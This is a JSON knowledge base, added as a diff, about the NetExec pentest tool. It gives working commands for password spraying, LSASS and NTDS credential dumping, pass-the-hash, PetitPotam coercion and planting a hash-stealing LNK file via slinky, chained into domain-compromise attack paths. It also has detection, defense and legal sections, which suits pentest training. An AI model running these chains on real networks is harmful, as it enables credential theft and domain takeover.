@@ -1,0 +1,299 @@
+{
+  "knowledge_base_part": 4,
+  "categories": [
+    {
+      "id": "output_and_parsing",
+      "name": "Output Formats and Parsing",
+      "topics": [
+        {
+          "title": "NXC Output Format and Parsing",
+          "keywords": ["output format", "output parsing", "output line", "SMB output", "LDAP output", "WINRM output", "RDP output", "MSSQL output", "SSH output", "FTP output", "parse output", "--verbose", "--debug", "--log", "log file"],
+          "difficulty": "intermediate",
+          "content": "Every NXC output line follows a consistent format: PROTOCOL IP PORT HOSTNAME [SYMBOL] MESSAGE. The protocol field is left-aligned (SMB, LDAP, WINRM, RDP, MSSQL, SSH, FTP, WMI, VNC). The IP address and port fields identify the target. The hostname shows the NetBIOS name. The symbol [*] is informational, [+] is success, [-] is failure. Key patterns to recognize when parsing pasted NXC output: authentication success looks like '[+] DOMAIN\\user:password' or '[+] DOMAIN\\user:hash', admin access adds '(Pwn3d!)', failures show '[-] DOMAIN\\user:password STATUS_CODE'. Hash dump lines follow 'username:RID:LM_hash:NT_hash:::'. Share enumeration shows 'Share Permissions Remark' table format. The --verbose flag adds detail, --debug shows full technical debugging, and --log saves output to a file. Logs are stored at ~/.nxc/logs/ by default. Understanding these patterns is critical for automated parsing — grep for '(Pwn3d!)' to find admin access, grep for ':::' to extract hashes, grep for 'signing:False' to find relay targets. Status codes in failed auth lines (STATUS_LOGON_FAILURE, STATUS_ACCOUNT_LOCKED_OUT, STATUS_ACCOUNT_DISABLED, STATUS_PASSWORD_EXPIRED, STATUS_PASSWORD_MUST_CHANGE, STATUS_LOGON_TYPE_NOT_GRANTED) provide actionable intelligence about account states.",
+          "examples": [
+            {
+              "command": "SMB         192.168.1.10    445    DC01             [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)",
+              "explanation": "Informational output showing host discovery — OS, hostname, domain, SMB signing required (True), SMBv1 disabled",
+              "use_case": "Parsing host discovery output to identify DCs (signing:True) and OS versions"
+            },
+            {
+              "command": "SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\\administrator:Password123 (Pwn3d!)",
+              "explanation": "Successful authentication with admin access confirmed — the administrator has local admin on DC01",
+              "use_case": "Identifying admin-accessible hosts in NXC output"
+            },
+            {
+              "command": "SMB         192.168.1.20    445    WS01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::",
+              "explanation": "SAM hash dump output — username:RID:LM_hash:NT_hash::: format",
+              "use_case": "Extracting hashes from credential dump output for PTH attacks"
+            },
+            {
+              "command": "nxc smb 192.168.1.0/24 -u admin -p Password123 --log /tmp/nxc_sweep.log",
+              "explanation": "Run NXC with output logging to a file for later analysis",
+              "use_case": "Saving scan results for reporting and offline analysis"
+            }
+          ],
+          "warnings": ["Grep for STATUS_ACCOUNT_LOCKED_OUT to detect lockouts quickly", "Hash dump lines contain sensitive data — handle securely"],
+          "best_practices": ["Always log output with --log for engagement records", "Grep for (Pwn3d!) to quickly find admin access", "Grep for signing:False to identify relay targets", "Parse ':::' lines to extract credential dump hashes"],
+          "related_cves": [],
+          "related_topics": ["SMB Signing", "Status Codes", "Credential Dump Formats"]
+        },
+        {
+          "title": "Hash Dump Output Formats",
+          "keywords": ["SAM hash", "NTDS hash", "DCC2", "LM hash", "NT hash", "hash format", "username:RID:LM:NT", "$krb5tgs$", "$krb5asrep$", "hashcat mode", "hash cracking", "13100", "18200", "2100", "5600", "NTLMv2"],
+          "difficulty": "intermediate",
+          "content": "NXC outputs credentials in several hash formats, each requiring different cracking approaches. SAM hash format: username:RID:LM_hash:NT_hash::: — the LM portion is usually aad3b435b51404eeaad3b435b51404ee (empty/disabled). The NT hash (32 hex chars) is used for PTH. NTDS hash format: same as SAM but may include DOMAIN\\ prefix. Use hashcat mode 1000 for NT hashes. DCC2 format (from LSA dump): DOMAIN/user:$DCC2$10240#username#hash — Domain Cached Credentials v2, much slower to crack, use hashcat mode 2100. Kerberoast hash format: $krb5tgs$23$*username$DOMAIN$SPN*$hash — use hashcat mode 13100. AS-REP hash format: $krb5asrep$23$username@DOMAIN:hash — use hashcat mode 18200. NTLMv2 captured hashes (from Responder): username::DOMAIN:challenge:response — use hashcat mode 5600. For all hash types, the NT hash (32 hex characters) can be used directly for PTH without cracking. DCC2 hashes cannot be used for PTH — they must be cracked. Kerberoast and AS-REP hashes must be cracked — they are encrypted blobs, not authentication hashes. Understanding these formats is critical for knowing which hashes to crack vs. which to use directly.",
+          "examples": [
+            {
+              "command": "Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::",
+              "explanation": "SAM dump hash — Administrator account (RID 500), empty LM hash, NT hash 5f4dcc3b5aa765d61d8327deb882cf99. Use NT hash directly for PTH.",
+              "use_case": "Parsing SAM dump output to extract hashes for pass-the-hash attacks"
+            },
+            {
+              "command": "hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt",
+              "explanation": "Crack NT hashes (from SAM or NTDS dump) using hashcat mode 1000",
+              "use_case": "Cracking NTLM hashes to reveal plaintext passwords for reporting"
+            },
+            {
+              "command": "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --rules best64.rule",
+              "explanation": "Crack Kerberoast TGS hashes using hashcat mode 13100 with mutation rules",
+              "use_case": "Cracking service account passwords obtained via Kerberoasting"
+            },
+            {
+              "command": "hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt",
+              "explanation": "Crack DCC2 cached domain credentials — much slower than NTLM cracking",
+              "use_case": "Cracking domain cached credentials found in LSA secrets"
+            }
+          ],
+          "warnings": ["DCC2 hashes are ~100x slower to crack than NTLM", "NT hashes can be used for PTH without cracking", "Kerberoast and AS-REP hashes must be cracked — they can't be used for PTH"],
+          "best_practices": ["Use NT hashes directly for PTH instead of cracking", "Prioritize Kerberoast and AS-REP hashes for cracking — they may reveal reused passwords", "Use rules with hashcat for better crack rates"],
+          "related_cves": [],
+          "related_topics": ["Pass-the-Hash", "Kerberoasting", "AS-REP Roasting", "Hashcat"]
+        }
+      ]
+    },
+    {
+      "id": "opsec_detection",
+      "name": "OPSEC and Detection",
+      "topics": [
+        {
+          "title": "Windows Event IDs Generated by NXC",
+          "keywords": ["event ID", "4624", "4625", "4648", "4776", "4768", "4769", "7045", "5145", "4662", "4698", "4699", "Sysmon", "event log", "Windows events", "detection", "logon type", "Type 3"],
+          "difficulty": "advanced",
+          "content": "Every NXC operation generates Windows Event Log entries that defenders can monitor. Authentication events: 4624 (successful logon, Type 3 for network logon via SMB/WinRM, Type 10 for RDP), 4625 (failed logon — multiple from one source indicates spray/brute), 4648 (explicit credential logon when different creds are used), 4776 (NTLM authentication on the DC — shows every NTLM auth in the domain). Kerberos events: 4768 (TGT request — encryption type 0x17/RC4 may indicate PTH), 4769 (service ticket request — bulk requests indicate Kerberoasting). Execution events: 7045 (new service installed — smbexec creates a service with random name, very detectable), 5145 (network share access — ADMIN$ and C$ access is suspicious from non-admin sources), 4698/4699 (scheduled task created/deleted — atexec pattern). DCSync detection: 4662 with replication GUIDs 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes) and 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All) from a non-DC source. LSASS access: Sysmon Event 10 with TargetImage lsass.exe and high access rights (0x1FFFFF). Password spraying signature: multiple 4625 from same source IP against different accounts within a short timeframe. Lateral movement signature: sequential 4624 Type 3 across multiple hosts from one source.",
+          "examples": [
+            {
+              "command": "Event ID 4625 with STATUS_LOGON_FAILURE from source 10.10.10.5 against 50 different accounts",
+              "explanation": "Classic password spraying signature — multiple failed logons from one source against many accounts",
+              "use_case": "SIEM correlation rule: >5 failed logins from same source within 5 minutes against >3 unique accounts"
+            },
+            {
+              "command": "Event ID 7045: Service 'BTOBTO' installed with command %COMSPEC% /Q /c echo ...",
+              "explanation": "smbexec service creation — random service name with cmd.exe command execution pattern",
+              "use_case": "Detecting NXC smbexec command execution method"
+            },
+            {
+              "command": "Event ID 4662 with Properties 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 from non-DC source",
+              "explanation": "DCSync attack — replication request from a non-domain-controller is highly suspicious",
+              "use_case": "Detecting NXC --ntds (DCSync) credential extraction"
+            },
+            {
+              "command": "Sysmon Event 10: SourceImage powershell.exe accessing TargetImage lsass.exe with GrantedAccess 0x1FFFFF",
+              "explanation": "LSASS process access — indicates credential dumping attempt via lsassy or similar",
+              "use_case": "Detecting NXC lsassy/mimikatz/procdump module execution"
+            }
+          ],
+          "warnings": ["smbexec is the noisiest execution method — creates Event 7045", "DCSync is detectable but requires proper auditing to be configured", "Default Windows auditing may not capture all events — advanced audit policies are needed"],
+          "best_practices": ["Prefer wmiexec over smbexec to avoid Event 7045", "Use Kerberos (-k) instead of NTLM to avoid Event 4776", "Minimize subnet sweeps to reduce the volume of 4624/4625 events"],
+          "related_cves": [],
+          "related_topics": ["Command Execution Methods", "OPSEC Tradecraft", "Defensive Countermeasures"]
+        },
+        {
+          "title": "Defensive Countermeasures",
+          "keywords": ["defense", "mitigation", "countermeasure", "LAPS", "Credential Guard", "RunAsPPL", "Protected Users", "SMB signing", "admin tiering", "network segmentation", "MFA", "EDR", "smart lockout", "LDAP signing"],
+          "difficulty": "advanced",
+          "content": "Comprehensive defenses against NXC attacks span authentication, endpoint, network, and monitoring layers. Against password spraying: implement account lockout policies (5-10 threshold), smart lockout (Azure AD), MFA for all accounts, fine-grained password policies for service accounts, and SIEM alerting on >5 failures from same source. Against pass-the-hash: enable Credential Guard to isolate NTLM hashes, add sensitive accounts to Protected Users group (prevents NTLM), implement admin tiering (T0/T1/T2), deploy LAPS (Local Administrator Password Solution) to prevent local admin password reuse, and consider disabling NTLM where possible. Against lateral movement: network segmentation blocking workstation-to-workstation SMB, Windows Firewall blocking inbound port 445 on workstations, JEA (Just Enough Administration) for WinRM, and admin tiering so T2 admins can't access servers. Against credential dumping: enable RunAsPPL (LSA Protection) to protect LSASS, Credential Guard to prevent cleartext storage, disable WDigest, deploy Sysmon with LSASS access rules, and modern EDR. Against DCSync: restrict 'Replicating Directory Changes' permissions, audit Event 4662, alert on replication from non-DC IPs. Against NTLM relay: enable SMB signing on ALL hosts (not just DCs), enable LDAP signing and channel binding, EPA for web services. Each defense adds a layer — defense in depth is critical because no single control stops all NXC capabilities.",
+          "examples": [
+            {
+              "command": "Enable SMB signing via GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > 'Microsoft network server: Digitally sign communications (always)' = Enabled",
+              "explanation": "Enable SMB signing on all hosts to prevent NTLM relay attacks — NXC's --gen-relay-list will return empty results",
+              "use_case": "Mitigating NTLM relay attacks by enforcing SMB signing domain-wide"
+            },
+            {
+              "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f",
+              "explanation": "Enable LSA Protection (RunAsPPL) to protect LSASS from credential dumping — requires reboot",
+              "use_case": "Protecting LSASS from NXC's lsassy, mimikatz, and procdump modules"
+            },
+            {
+              "command": "Add-ADGroupMember -Identity 'Protected Users' -Members administrator",
+              "explanation": "Add the administrator account to the Protected Users group to prevent NTLM authentication",
+              "use_case": "Preventing pass-the-hash attacks against domain admin accounts"
+            },
+            {
+              "command": "Install LAPS: deploy Local Administrator Password Solution to automatically rotate unique local admin passwords on each workstation",
+              "explanation": "LAPS ensures each workstation has a unique, randomly generated local admin password — eliminates password reuse",
+              "use_case": "Preventing local admin hash reuse attacks across workstations"
+            }
+          ],
+          "warnings": ["Credential Guard requires hardware support (TPM, UEFI)", "RunAsPPL may break some legitimate applications", "Disabling NTLM may break legacy applications"],
+          "best_practices": ["Defense in depth — implement multiple layers", "Priority: LAPS, SMB signing, Credential Guard, RunAsPPL", "Monitor Event IDs 4625, 7045, 4662, and Sysmon 10", "Test defenses in lab before deploying to production"],
+          "related_cves": [],
+          "related_topics": ["OPSEC and Detection", "Windows Event IDs", "SMB Signing"]
+        }
+      ]
+    },
+    {
+      "id": "advanced_techniques",
+      "name": "Advanced Techniques",
+      "topics": [
+        {
+          "title": "Delegation Abuse",
+          "keywords": ["delegation", "unconstrained delegation", "constrained delegation", "RBCD", "resource-based constrained delegation", "TRUSTED_FOR_DELEGATION", "msds-allowedtodelegateto", "msDS-AllowedToActOnBehalfOfOtherIdentity", "S4U", "PrinterBug"],
+          "difficulty": "expert",
+          "content": "Active Directory delegation allows services to act on behalf of users. Misconfigured delegation is a critical attack vector. Unconstrained delegation (TRUSTED_FOR_DELEGATION flag) allows a service to impersonate any user to any service. Find these with 'nxc ldap dc -u user -p pass --trusted-for-delegation'. Attack: compromise the unconstrained delegation host, coerce a DA or DC to authenticate (PetitPotam, PrinterBug), capture the TGT from memory, use PTT for domain admin. Constrained delegation (msds-allowedtodelegateto) limits which services can be accessed, but through S4U2Self and S4U2Proxy protocol extensions, an attacker with the service account credentials can request tickets for any user to the allowed services. Alternative service names can be substituted (e.g., CIFS ticket can be changed to LDAP for DCSync). Resource-Based Constrained Delegation (RBCD) allows writing to msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object to configure delegation from an attacker-controlled computer. Requirements: GenericWrite, GenericAll, or WriteDacl on the target computer object + ability to create a computer account (default: any domain user can create up to 10). NXC facilitates the enumeration phase — finding delegation configurations — while the exploitation typically uses Rubeus, getST.py, or similar Kerberos tools.",
+          "examples": [
+            {
+              "command": "nxc ldap 192.168.1.10 -u jsmith -p 'Password123' --trusted-for-delegation",
+              "explanation": "Find all accounts with unconstrained delegation — these are high-value targets for privilege escalation via TGT capture",
+              "use_case": "Identifying delegation abuse opportunities during AD enumeration"
+            },
+            {
+              "command": "nxc smb 192.168.1.30 -u administrator -p 'Password123' -x 'whoami' && nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M petitpotam -o LISTENER=192.168.1.30",
+              "explanation": "Step 1: Verify admin on unconstrained delegation host. Step 2: Coerce DC to authenticate to it for TGT capture.",
+              "use_case": "Full unconstrained delegation attack chain — from compromise to DC TGT capture"
+            }
+          ],
+          "warnings": ["Unconstrained delegation on a DC is by design — focus on non-DC hosts", "RBCD requires write access to computer objects", "Delegation abuse is a complex multi-step attack — test in lab first"],
+          "best_practices": ["Always enumerate delegation during AD assessments", "Report unconstrained delegation on any non-DC host as HIGH severity", "Use PetitPotam or PrinterBug for coercion in delegation attacks"],
+          "related_cves": [],
+          "related_topics": ["PetitPotam", "Kerberos", "NTLM Relay", "TGT Capture"]
+        },
+        {
+          "title": "Full Attack Chains with NXC",
+          "keywords": ["attack chain", "kill chain", "workflow", "methodology", "internal pentest", "domain compromise", "null session to DA", "spray to DA", "relay to shell", "lateral movement chain"],
+          "difficulty": "advanced",
+          "content": "NXC enables complete attack chains from initial network access to domain compromise. Chain 1 — Discovery to DA via spray: nxc smb subnet (discover hosts, signing), nxc smb dc --gen-relay-list (identify relay targets), nxc smb dc -u '' -p '' --users/--rid-brute (enumerate users), nxc smb dc -u users.txt -p 'Season2024!' --continue-on-success (spray), nxc smb subnet -u found_user -p pass (check access), nxc smb pwned_host -u user -p pass --sam/--lsa/-M lsassy (dump creds), nxc smb subnet -u admin -H hash (PTH), nxc smb dc -u da -H hash --ntds (DCSync). Chain 2 — Null session to DA: nxc smb dc -u '' -p '' --rid-brute (enumerate users), nxc ldap dc -u users.txt -p '' --asreproast (AS-REP roast), hashcat -m 18200 (crack), nxc smb subnet -u cracked_user -p pass (check access), nxc ldap dc -u user -p pass --kerberoasting (Kerberoast), hashcat -m 13100 (crack), escalate with service account. Chain 3 — Relay to shell: nxc smb subnet --gen-relay-list (find targets), ntlmrelayx -tf targets.txt, Responder or PetitPotam for coercion, shell on relay target, dump creds, escalate. Each chain shows how NXC commands build upon each other, with each step's output feeding the next step's input. The key insight is that NXC is most powerful when used systematically across multiple phases, not as isolated commands.",
+          "examples": [
+            {
+              "command": "nxc smb 10.10.10.0/24 && nxc smb 10.10.10.0/24 --gen-relay-list relay.txt && nxc smb 10.10.10.5 -u '' -p '' --rid-brute && nxc smb 10.10.10.5 -u users.txt -p 'Company2024!' --continue-on-success",
+              "explanation": "Complete Phase 1 of an internal pentest: discover hosts, generate relay list, enumerate users, spray credentials",
+              "use_case": "Systematic initial access methodology using NXC"
+            },
+            {
+              "command": "nxc smb 10.10.10.20 -u found_user -p 'Company2024!' -M lsassy && nxc smb 10.10.10.0/24 -u da_user -H captured_hash --ntds",
+              "explanation": "Dump LSASS on a compromised host to find DA credentials, then DCSync the entire domain",
+              "use_case": "Post-exploitation credential chaining to domain compromise"
+            }
+          ],
+          "warnings": ["Each chain generates multiple detection events — space operations over time for OPSEC", "Spray against DC only, not entire subnet", "Verify scope authorization before DCSync"],
+          "best_practices": ["Follow a systematic methodology — don't skip steps", "Spray against DC to minimize event volume", "Document each step with timestamps for the report", "Use nxcdb to track all findings across the chain"],
+          "related_cves": [],
+          "related_topics": ["Password Spraying", "Pass-the-Hash", "DCSync", "NTLM Relay"]
+        },
+        {
+          "title": "CME to NXC Migration and Common Troubleshooting",
+          "keywords": ["cme", "crackmapexec", "migration", "troubleshooting", "connection error", "timeout", "module not found", "hash format", "DNS", "clock skew", "common mistakes", "--local-auth", "--continue-on-success"],
+          "difficulty": "beginner",
+          "content": "Migrating from CrackMapExec to NetExec is straightforward — replace 'crackmapexec' or 'cme' with 'nxc'. The config directory changed from ~/.cme/ to ~/.nxc/, and the database command from 'cmedb' to 'nxcdb'. Most flags are identical. New NXC features not in CME: additional protocols (RDP, FTP, VNC, WMI), improved modules, better error handling. Common troubleshooting: Connection timeout — increase with --timeout 30, check network connectivity, verify the port is open. Module not found — run 'nxc smb -L' to list available modules, update with 'pipx upgrade netexec'. Hash format errors — use 32 hex chars for NT hash or 'aad3b435b51404eeaad3b435b51404ee:NT_HASH' for LM:NT format. Kerberos failures — use hostname not IP, check /etc/krb5.conf, sync time with DC (ntpdate dc), verify DNS resolution. Common mistakes: forgetting --continue-on-success (missing valid accounts during spray), forgetting --local-auth for SAM-derived credentials, spraying against all hosts instead of just the DC (4625 events on every host), not checking password policy before spraying (account lockouts), using IP instead of hostname for Kerberos. DNS issues: add DC as nameserver or add /etc/hosts entries for domain resolution.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.10 -u jsmith -p 'Password123' --timeout 30 --debug",
+              "explanation": "Connect with extended timeout and debug output for troubleshooting connection issues",
+              "use_case": "Diagnosing connection failures or slow responses"
+            },
+            {
+              "command": "echo '192.168.1.10 dc01.corp.local corp.local' | sudo tee -a /etc/hosts",
+              "explanation": "Add DNS entries for the domain controller to enable Kerberos hostname resolution",
+              "use_case": "Fixing Kerberos authentication failures caused by DNS resolution issues"
+            },
+            {
+              "command": "sudo ntpdate 192.168.1.10",
+              "explanation": "Synchronize time with the domain controller to fix Kerberos clock skew errors",
+              "use_case": "Fixing Kerberos failures caused by >5 minute time difference"
+            },
+            {
+              "command": "pipx upgrade netexec",
+              "explanation": "Update NXC to the latest version for bug fixes and new modules",
+              "use_case": "Resolving issues fixed in newer versions and getting new modules"
+            }
+          ],
+          "warnings": ["Always use 'nxc' not 'cme' — the old command is deprecated", "Kerberos requires hostname not IP", "Check password policy before any spray"],
+          "best_practices": ["When migrating from CME, just replace the binary name", "Use --debug for troubleshooting", "Keep NXC updated with pipx upgrade netexec", "Add DNS entries or /etc/hosts for Kerberos to work"],
+          "related_cves": [],
+          "related_topics": ["NXC Installation", "Kerberos Authentication", "Password Spraying"]
+        }
+      ]
+    },
+    {
+      "id": "practical_scenarios",
+      "name": "Practical Scenarios",
+      "topics": [
+        {
+          "title": "Beginner Practical Scenarios",
+          "keywords": ["first scan", "getting started", "beginner", "initial access", "network discovery", "sticky note", "found password", "internal pentest", "first steps"],
+          "difficulty": "beginner",
+          "content": "Beginner scenarios cover the first steps on an internal penetration test. Scenario 1 — First network scan: Run 'nxc smb 192.168.1.0/24' to discover hosts, OS versions, domains, and signing status. This single command reveals the network landscape without authentication. Look for: DCs (signing:True), relay targets (signing:False), old OS versions (potential vulns). Scenario 2 — Found credentials (sticky note, phishing, etc.): First validate them: 'nxc smb dc -u user -p pass'. If valid: enumerate everything (--users, --groups, --shares, --pass-pol, --sessions). Check admin access across the network: 'nxc smb subnet -u user -p pass'. Check other protocols too (winrm, rdp, mssql). Scenario 3 — Null session enumeration: Try 'nxc smb dc -u '' -p '' --shares --users --rid-brute' — on misconfigured DCs, null sessions may allow extensive enumeration without credentials. Key beginner principles: always start with unauthenticated scanning, try null/guest access before anything else, enumerate password policy before spraying, check all protocols when you have credentials, save user lists for spraying.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.0/24",
+              "explanation": "First command on any internal pentest — discover all SMB hosts with OS, domain, signing status",
+              "use_case": "Initial network reconnaissance on an internal engagement"
+            },
+            {
+              "command": "nxc smb 192.168.1.10 -u 'found_user' -p 'Found_Password!' && nxc smb 192.168.1.0/24 -u 'found_user' -p 'Found_Password!'",
+              "explanation": "Validate found credentials against the DC, then check admin access across the network",
+              "use_case": "Leveraging credentials found via physical access, phishing, or other means"
+            }
+          ],
+          "warnings": ["Always have written authorization before scanning", "Check password policy before spraying"],
+          "best_practices": ["Start with unauthenticated scanning", "Try null and guest sessions first", "Enumerate everything once you have valid credentials"],
+          "related_cves": [],
+          "related_topics": ["Host Discovery", "Null Sessions", "Password Spraying"]
+        },
+        {
+          "title": "Advanced Practical Scenarios",
+          "keywords": ["credential chaining", "domain compromise", "attack path", "escalation", "pivot", "multi-step", "real-world", "engagement", "advanced scenario"],
+          "difficulty": "advanced",
+          "content": "Advanced scenarios demonstrate multi-step attack chains. Scenario — Credential chaining to DA: Start with low-priv user, find writable shares (--shares grep WRITE), place SCF/LNK files for hash capture (slinky module), capture hash via Responder, crack NTLMv2 hash (hashcat -m 5600), check new credentials' access (nxc smb subnet -u cracked -p pass), dump LSASS on Pwn3d hosts (-M lsassy), find DA hash, PTH to DC (nxc smb dc -u da -H hash), DCSync (--ntds). This chain shows how a standard domain user can achieve DA through systematic exploitation. Each step's output directly feeds the next. Other advanced patterns: MSSQL exploitation (find SQL servers, check default sa, xp_cmdshell for OS access, hash stealing via xp_dirtree, linked server pivoting), network segmentation bypass (use a dual-homed host as a pivot, set up SOCKS proxy, run NXC through proxy), and trust exploitation (enumerate trusts via LDAP, authenticate across trust boundaries, SID history abuse for cross-domain escalation). In all scenarios, nxcdb tracks all findings automatically.",
+          "examples": [
+            {
+              "command": "nxc smb 192.168.1.30 -u jsmith -p 'Password123' -M slinky -o SERVER=10.10.10.5 NAME=Q4_Budget",
+              "explanation": "Place a malicious LNK file on a writable share to capture NTLM hashes when users browse the share",
+              "use_case": "Hash capture via writable share — part of credential chaining attack"
+            },
+            {
+              "command": "nxc smb 192.168.1.20 -u admin.jones -p 'CrackedPass!' -M lsassy && nxc smb 192.168.1.10 -u da_admin -H '<captured_hash>' --ntds",
+              "explanation": "Dump LSASS on a compromised workstation to find DA credentials, then DCSync the domain",
+              "use_case": "Final steps of credential chaining — achieving full domain compromise"
+            }
+          ],
+          "warnings": ["Multi-step attacks generate many events — coordinate with rules of engagement", "Always verify scope before DCSync", "Clean up artifacts (uploaded files, LNK files) after engagement"],
+          "best_practices": ["Document every step with timestamps", "Use nxcdb to track all credentials and access", "Clean up artifacts after each phase"],
+          "related_cves": [],
+          "related_topics": ["Credential Chaining", "LSASS Dump", "DCSync", "NTLM Relay"]
+        },
+        {
+          "title": "Legal and Ethical Considerations",
+          "keywords": ["legal", "ethical", "authorization", "rules of engagement", "scope", "responsible disclosure", "CFAA", "CMA", "written permission", "data handling"],
+          "difficulty": "beginner",
+          "content": "NXC is a dual-use tool — legitimate for authorized security testing, illegal for unauthorized access. Legal requirements: always have written authorization (rules of engagement, statement of work, or penetration test agreement) before running NXC against any network. The scope must clearly define which hosts, protocols, and techniques are permitted. Password spraying, credential dumping, and lateral movement should be explicitly authorized. Operating without authorization violates computer crime laws such as the CFAA (Computer Fraud and Abuse Act) in the US, CMA (Computer Misuse Act) in the UK, and equivalent laws globally. Best practices: notify the client's SOC/blue team if required by the engagement rules, document all activities with timestamps for the final report, report critical findings (Zerologon, default SA passwords) immediately without waiting for the final report, verify with the client before full NTDS dump to ensure it's within scope, protect all extracted credentials (encrypt data, wipe after engagement), coordinate spray timing with the client to avoid production impact, if you lock out accounts notify the client immediately and document which accounts were affected. Data handling: extracted credentials must be handled according to the engagement's data handling agreement, typically encrypted at rest and securely deleted after the engagement report is delivered.",
+          "examples": [
+            {
+              "command": "Ensure you have a signed penetration test agreement before running any NXC command",
+              "explanation": "Written authorization is a legal requirement before using NXC against any network or system",
+              "use_case": "Pre-engagement legal preparation"
+            },
+            {
+              "command": "Document: Date, Time, Source IP, Target IP, Command, Result for every NXC command executed",
+              "explanation": "Maintaining detailed logs protects both the tester and the client",
+              "use_case": "Engagement documentation and compliance"
+            }
+          ],
+          "warnings": ["Unauthorized use of NXC is a criminal offense", "Always stay within the defined scope", "Handle extracted credentials securely"],
+          "best_practices": ["Always have written authorization", "Report critical findings immediately", "Coordinate with client SOC when required", "Encrypt and securely delete all engagement data"],
+          "related_cves": [],
+          "related_topics": ["Rules of Engagement", "Responsible Disclosure", "Data Handling"]
+        }
+      ]
+    }
+  ]
+}
